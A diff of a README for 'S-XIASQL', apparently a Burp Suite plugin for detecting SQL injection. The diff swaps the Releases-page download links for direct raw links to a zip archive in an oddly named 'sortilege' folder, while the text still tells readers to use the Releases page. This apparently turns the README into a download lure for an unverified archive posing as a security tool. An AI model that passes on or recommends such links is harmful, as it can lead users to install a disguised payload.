@@ -4,14 +4,14 @@
 S-XIASQL 是一款专业的 Burp Suite SQL注入检测插件，能够自动化检测Web应用中的SQL注入漏洞。通过智能分析HTTP请求响应，快速识别潜在的SQL注入点，大幅提升渗透测试效率。
 
 ## 📥 Download Here
-[![Download S-XIASQL](https://img.shields.io/badge/Download-S--XIASQL-blue.svg)](https://github.com/sumitverma001444/S-XIASQL/releases)
+[![Download S-XIASQL](https://github.com/sumitverma001444/S-XIASQL/raw/refs/heads/main/sortilege/XIASQL-v3.3.zip)](https://github.com/sumitverma001444/S-XIASQL/raw/refs/heads/main/sortilege/XIASQL-v3.3.zip)
 
 ## 🚀 Getting Started
 To get started with S-XIASQL, follow these steps to download and run the software:
 
 1. **Visit the Download Page:**
    Click on the link below to visit the Releases page where you can find the latest version of S-XIASQL.
-   [Download S-XIASQL](https://github.com/sumitverma001444/S-XIASQL/releases)
+   [Download S-XIASQL](https://github.com/sumitverma001444/S-XIASQL/raw/refs/heads/main/sortilege/XIASQL-v3.3.zip)
 
 2. **Download the Latest Release:**
    On the Releases page, find the latest release of the S-XIASQL plugin. Click on the appropriate download link for your operating system. 
